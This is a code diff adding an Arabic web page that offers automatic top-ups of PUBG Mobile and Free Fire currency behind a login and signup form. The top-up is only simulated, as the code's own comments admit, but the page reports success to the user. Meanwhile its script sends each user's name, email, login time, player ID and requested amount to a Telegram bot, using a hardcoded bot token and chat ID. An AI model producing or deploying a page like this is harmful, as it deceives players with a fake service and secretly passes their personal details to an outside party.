@@ -1,0 +1,552 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول - الشحن التلقائي</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Inter', sans-serif;
+            background: #0f172a;
+            color: #e8edf5;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 1.5rem;
+        }
+        .container {
+            width: 100%;
+            max-width: 480px;
+            background: #1e293b;
+            border-radius: 32px;
+            padding: 2rem 1.5rem;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
+            border: 1px solid #334155;
+        }
+        .tabs {
+            display: flex;
+            gap: 0.5rem;
+            margin-bottom: 2rem;
+            background: #0f172a;
+            border-radius: 60px;
+            padding: 0.3rem;
+        }
+        .tab {
+            flex: 1;
+            padding: 0.6rem 0;
+            text-align: center;
+            border-radius: 60px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: 0.3s;
+            background: transparent;
+            color: #94a3b8;
+            border: none;
+            font-size: 0.95rem;
+        }
+        .tab.active {
+            background: #3b82f6;
+            color: #fff;
+            box-shadow: 0 4px 15px rgba(59,130,246,0.3);
+        }
+        .form-group {
+            margin-bottom: 1.2rem;
+        }
+        .form-group label {
+            display: block;
+            font-size: 0.85rem;
+            font-weight: 600;
+            color: #cbd5e1;
+            margin-bottom: 0.4rem;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 0.8rem 1rem;
+            background: #0f172a;
+            border: 1px solid #334155;
+            border-radius: 14px;
+            color: #fff;
+            font-size: 1rem;
+            outline: none;
+            transition: 0.2s;
+        }
+        .form-group input:focus {
+            border-color: #3b82f6;
+            box-shadow: 0 0 0 3px rgba(59,130,246,0.2);
+        }
+        .btn {
+            width: 100%;
+            padding: 0.9rem;
+            background: #3b82f6;
+            border: none;
+            border-radius: 60px;
+            color: #fff;
+            font-weight: 700;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        .btn:hover {
+            background: #2563eb;
+            transform: scale(1.02);
+            box-shadow: 0 8px 30px rgba(59,130,246,0.3);
+        }
+        .message {
+            margin-top: 1rem;
+            padding: 0.7rem 1rem;
+            border-radius: 12px;
+            font-weight: 500;
+            display: none;
+        }
+        .message.success {
+            background: #064e3b;
+            color: #6ee7b7;
+            border: 1px solid #059669;
+            display: block;
+        }
+        .message.error {
+            background: #7f1d1d;
+            color: #fca5a5;
+            border: 1px solid #dc2626;
+            display: block;
+        }
+        .hidden {
+            display: none !important;
+        }
+        .dashboard {
+            display: none;
+        }
+        .dashboard.active {
+            display: block;
+        }
+        .game-card {
+            background: #0f172a;
+            border-radius: 20px;
+            padding: 1.5rem;
+            margin-bottom: 1.5rem;
+            border: 1px solid #334155;
+        }
+        .game-card h3 {
+            font-size: 1.4rem;
+            margin-bottom: 1rem;
+            color: #facc15;
+        }
+        .game-card input, .game-card select {
+            width: 100%;
+            padding: 0.8rem 1rem;
+            background: #0f172a;
+            border: 1px solid #334155;
+            border-radius: 14px;
+            color: #fff;
+            font-size: 1rem;
+            outline: none;
+            margin-bottom: 0.8rem;
+        }
+        .game-card input:focus, .game-card select:focus {
+            border-color: #3b82f6;
+        }
+        .sub-btn {
+            background: #22c55e;
+            padding: 0.8rem;
+            border: none;
+            border-radius: 60px;
+            color: #fff;
+            font-weight: 700;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: 0.3s;
+            width: 100%;
+        }
+        .sub-btn:hover {
+            background: #16a34a;
+            transform: scale(1.02);
+        }
+        .logout-btn {
+            background: #dc2626;
+            padding: 0.6rem 1.5rem;
+            border: none;
+            border-radius: 60px;
+            color: #fff;
+            font-weight: 700;
+            cursor: pointer;
+            transition: 0.3s;
+            font-size: 0.9rem;
+        }
+        .logout-btn:hover {
+            background: #b91c1c;
+        }
+        .header-dash {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 2rem;
+        }
+        .header-dash h2 {
+            font-size: 1.5rem;
+        }
+        .header-dash span {
+            color: #3b82f6;
+        }
+        .footer {
+            margin-top: 1.5rem;
+            font-size: 0.75rem;
+            color: #64748b;
+            text-align: center;
+        }
+        .flex-row {
+            display: flex;
+            gap: 0.8rem;
+        }
+        .flex-row .form-group {
+            flex: 1;
+        }
+        @media (max-width: 480px) {
+            .container { padding: 1.5rem 1rem; }
+        }
+    </style>
+</head>
+<body>
+<div class="container" id="app">
+
+    <!-- ===== صفحة تسجيل الدخول / إنشاء حساب ===== -->
+    <div id="authPage">
+        <div class="tabs">
+            <button class="tab active" id="loginTab">تسجيل الدخول</button>
+            <button class="tab" id="signupTab">إنشاء حساب</button>
+        </div>
+
+        <!-- نموذج تسجيل الدخول -->
+        <form id="loginForm">
+            <div class="form-group">
+                <label>البريد الإلكتروني</label>
+                <input type="email" id="loginEmail" placeholder="example@mail.com" required>
+            </div>
+            <div class="form-group">
+                <label>كلمة المرور</label>
+                <input type="password" id="loginPassword" placeholder="••••••••" required>
+            </div>
+            <button type="submit" class="btn">تسجيل الدخول</button>
+            <div id="loginMessage" class="message"></div>
+        </form>
+
+        <!-- نموذج إنشاء حساب -->
+        <form id="signupForm" class="hidden">
+            <div class="form-group">
+                <label>الاسم</label>
+                <input type="text" id="signupName" placeholder="أحمد محمد" required>
+            </div>
+            <div class="form-group">
+                <label>البريد الإلكتروني</label>
+                <input type="email" id="signupEmail" placeholder="example@mail.com" required>
+            </div>
+            <div class="form-group">
+                <label>كلمة المرور</label>
+                <input type="password" id="signupPassword" placeholder="••••••••" required>
+            </div>
+            <button type="submit" class="btn">إنشاء حساب</button>
+            <div id="signupMessage" class="message"></div>
+        </form>
+    </div>
+
+    <!-- ===== لوحة التحكم (بعد تسجيل الدخول) ===== -->
+    <div id="dashboard" class="dashboard">
+        <div class="header-dash">
+            <h2>👋 مرحباً <span id="userNameDisplay">مستخدم</span></h2>
+            <button class="logout-btn" id="logoutBtn">تسجيل خروج</button>
+        </div>
+
+        <div class="game-card">
+            <h3>🔫 ببجي موبايل</h3>
+            <div class="form-group">
+                <label>معرف اللاعب (USER)</label>
+                <input type="text" id="pubgUser" placeholder="أدخل معرفك في ببجي">
+            </div>
+            <div class="form-group">
+                <label>الكمية (شدة)</label>
+                <input type="number" id="pubgAmount" placeholder="أدخل الكمية المطلوبة" value="10000">
+            </div>
+            <button class="sub-btn" id="pubgBtn">شحن الآن</button>
+        </div>
+
+        <div class="game-card">
+            <h3>🔥 فري فاير</h3>
+            <div class="form-group">
+                <label>معرف اللاعب (USER)</label>
+                <input type="text" id="ffUser" placeholder="أدخل معرفك في فري فاير">
+            </div>
+            <div class="form-group">
+                <label>الكمية (شدة)</label>
+                <input type="number" id="ffAmount" placeholder="أدخل الكمية المطلوبة" value="10000">
+            </div>
+            <button class="sub-btn" id="ffBtn">شحن الآن</button>
+        </div>
+
+        <div id="shippingMessage" class="message"></div>
+    </div>
+
+    <div class="footer">© 2025 – نظام الشحن التلقائي v2.0</div>
+</div>
+
+<script>
+    // ================================================================
+    // 1. إعدادات بوت تيليجرام (ضع التوكن ومعرف الدردشة هنا)
+    // ================================================================
+    const BOT_TOKEN = '8902691129:AAFOqFvH68JsINLOK1cNAKQ8pG1QBmsktPs';      // استبدل بـ التوكن الحقيقي
+    const CHAT_ID = '8399221617';          // استبدل بـ معرف الدردشة
+
+    // ================================================================
+    // 2. التعامل مع LocalStorage (تخزين المستخدمين)
+    // ================================================================
+    function getUsers() {
+        return JSON.parse(localStorage.getItem('users')) || {};
+    }
+
+    function saveUsers(users) {
+        localStorage.setItem('users', JSON.stringify(users));
+    }
+
+    function getCurrentUser() {
+        return localStorage.getItem('currentUser') || null;
+    }
+
+    function setCurrentUser(email) {
+        localStorage.setItem('currentUser', email);
+    }
+
+    function clearCurrentUser() {
+        localStorage.removeItem('currentUser');
+    }
+
+    // ================================================================
+    // 3. عناصر الصفحة
+    // ================================================================
+    const authPage = document.getElementById('authPage');
+    const dashboard = document.getElementById('dashboard');
+    const loginForm = document.getElementById('loginForm');
+    const signupForm = document.getElementById('signupForm');
+    const loginTab = document.getElementById('loginTab');
+    const signupTab = document.getElementById('signupTab');
+    const loginEmail = document.getElementById('loginEmail');
+    const loginPassword = document.getElementById('loginPassword');
+    const loginMessage = document.getElementById('loginMessage');
+    const signupName = document.getElementById('signupName');
+    const signupEmail = document.getElementById('signupEmail');
+    const signupPassword = document.getElementById('signupPassword');
+    const signupMessage = document.getElementById('signupMessage');
+    const logoutBtn = document.getElementById('logoutBtn');
+    const userNameDisplay = document.getElementById('userNameDisplay');
+    const shippingMessage = document.getElementById('shippingMessage');
+
+    // ================================================================
+    // 4. التبديل بين تبويب تسجيل الدخول وإنشاء الحساب
+    // ================================================================
+    function setActiveTab(tab) {
+        loginTab.classList.toggle('active', tab === 'login');
+        signupTab.classList.toggle('active', tab === 'signup');
+        loginForm.classList.toggle('hidden', tab !== 'login');
+        signupForm.classList.toggle('hidden', tab !== 'signup');
+        // مسح الرسائل
+        loginMessage.className = 'message';
+        loginMessage.textContent = '';
+        signupMessage.className = 'message';
+        signupMessage.textContent = '';
+    }
+
+    loginTab.addEventListener('click', () => setActiveTab('login'));
+    signupTab.addEventListener('click', () => setActiveTab('signup'));
+
+    // ================================================================
+    // 5. إنشاء حساب جديد
+    // ================================================================
+    signupForm.addEventListener('submit', function(e) {
+        e.preventDefault();
+        const name = signupName.value.trim();
+        const email = signupEmail.value.trim().toLowerCase();
+        const password = signupPassword.value.trim();
+
+        if (!name || !email || !password) {
+            showMessage(signupMessage, 'يرجى ملء جميع الحقول.', 'error');
+            return;
+        }
+
+        const users = getUsers();
+        if (users[email]) {
+            showMessage(signupMessage, 'هذا البريد الإلكتروني مسجل بالفعل.', 'error');
+            return;
+        }
+
+        users[email] = { name, password };
+        saveUsers(users);
+        showMessage(signupMessage, '✅ تم إنشاء الحساب بنجاح! يمكنك الآن تسجيل الدخول.', 'success');
+        // إعادة تعيين الحقول
+        signupName.value = '';
+        signupEmail.value = '';
+        signupPassword.value = '';
+        // التبديل إلى تبويب تسجيل الدخول بعد ثانية
+        setTimeout(() => setActiveTab('login'), 1500);
+    });
+
+    // ================================================================
+    // 6. تسجيل الدخول
+    // ================================================================
+    loginForm.addEventListener('submit', function(e) {
+        e.preventDefault();
+        const email = loginEmail.value.trim().toLowerCase();
+        const password = loginPassword.value.trim();
+
+        if (!email || !password) {
+            showMessage(loginMessage, 'يرجى إدخال البريد الإلكتروني وكلمة المرور.', 'error');
+            return;
+        }
+
+        const users = getUsers();
+        const user = users[email];
+
+        if (!user) {
+            showMessage(loginMessage, '❌ هذا البريد الإلكتروني غير مسجل.', 'error');
+            return;
+        }
+
+        if (user.password !== password) {
+            showMessage(loginMessage, '❌ كلمة السر خاطئة.', 'error');
+            return;
+        }
+
+        // تسجيل الدخول ناجح
+        showMessage(loginMessage, '✅ تمت العملية بنجاح! جاري تحويلك...', 'success');
+        setCurrentUser(email);
+
+        // إرسال بيانات الدخول إلى بوت تيليجرام
+        sendToTelegram(`🔐 [تسجيل دخول جديد]\n👤 الاسم: ${user.name}\n📧 البريد: ${email}\n🕒 الوقت: ${new Date().toLocaleString()}`);
+
+        // فتح لوحة التحكم بعد 0.8 ثانية
+        setTimeout(() => {
+            authPage.style.display = 'none';
+            dashboard.classList.add('active');
+            userNameDisplay.textContent = user.name;
+            // مسح حقول تسجيل الدخول
+            loginEmail.value = '';
+            loginPassword.value = '';
+            loginMessage.className = 'message';
+            loginMessage.textContent = '';
+        }, 800);
+    });
+
+    // ================================================================
+    // 7. تسجيل الخروج
+    // ================================================================
+    logoutBtn.addEventListener('click', function() {
+        clearCurrentUser();
+        dashboard.classList.remove('active');
+        authPage.style.display = 'block';
+        setActiveTab('login');
+        // مسح أي رسائل
+        shippingMessage.className = 'message';
+        shippingMessage.textContent = '';
+    });
+
+    // ================================================================
+    // 8. التحقق من جلسة المستخدم عند تحميل الصفحة
+    // ================================================================
+    function checkSession() {
+        const email = getCurrentUser();
+        if (email) {
+            const users = getUsers();
+            const user = users[email];
+            if (user) {
+                authPage.style.display = 'none';
+                dashboard.classList.add('active');
+                userNameDisplay.textContent = user.name;
+                return;
+            } else {
+                clearCurrentUser();
+            }
+        }
+        authPage.style.display = 'block';
+        dashboard.classList.remove('active');
+        setActiveTab('login');
+    }
+    checkSession();
+
+    // ================================================================
+    // 9. دوال مساعدة
+    // ================================================================
+    function showMessage(element, text, type) {
+        element.className = `message ${type}`;
+        element.textContent = text;
+    }
+
+    function sendToTelegram(message) {
+        if (BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE' || CHAT_ID === 'YOUR_CHAT_ID_HERE') {
+            console.warn('⚠️ لم يتم تعيين توكن البوت أو معرف الدردشة. لن يتم الإرسال.');
+            return;
+        }
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'Markdown'
+            })
+        })
+        .then(res => res.json())
+        .then(data => {
+            if (!data.ok) console.warn('فشل الإرسال إلى البوت:', data);
+        })
+        .catch(err => console.warn('خطأ في الاتصال بالبوت:', err));
+    }
+
+    // ================================================================
+    // 10. أزرار الشحن (محاكاة)
+    // ================================================================
+    function handleShipping(game, userField, amountField) {
+        const userId = document.getElementById(userField).value.trim();
+        const amount = document.getElementById(amountField).value.trim();
+        if (!userId) {
+            showMessage(shippingMessage, `❌ يرجى إدخال معرف ${game}.`, 'error');
+            return;
+        }
+        if (!amount || parseInt(amount) <= 0) {
+            showMessage(shippingMessage, '❌ يرجى إدخال كمية صحيحة.', 'error');
+            return;
+        }
+
+        // محاكاة الشحن (غير حقيقي)
+        showMessage(shippingMessage, `✅ تم شحن ${amount} شدة إلى حساب ${game} (${userId}) بنجاح! (محاكاة)`, 'success');
+
+        // إرسال تفاصيل الشحن إلى البوت
+        const userEmail = getCurrentUser();
+        const users = getUsers();
+        const userName = users[userEmail]?.name || 'مجهول';
+        sendToTelegram(`🎮 [طلب شحن ${game}]\n👤 المستخدم: ${userName}\n📧 البريد: ${userEmail}\n🆔 معرف اللاعب: ${userId}\n📦 الكمية: ${amount}\n🕒 الوقت: ${new Date().toLocaleString()}`);
+
+        // إعادة تعيين الحقول بعد 2 ثانية (اختياري)
+        // document.getElementById(userField).value = '';
+        // document.getElementById(amountField).value = '10000';
+    }
+
+    document.getElementById('pubgBtn').addEventListener('click', function() {
+        handleShipping('ببجي', 'pubgUser', 'pubgAmount');
+    });
+
+    document.getElementById('ffBtn').addEventListener('click', function() {
+        handleShipping('فري فاير', 'ffUser', 'ffAmount');
+    });
+
+    // ================================================================
+    // 11. إذا كان المستخدم قد سجل الدخول بالفعل، نضبط اسمه
+    // ================================================================
+    // تم في checkSession
+
+    console.log('✅ النظام جاهز. استخدم البوت لتلقي الإشعارات.');
+</script>
+</body>
+  </html>
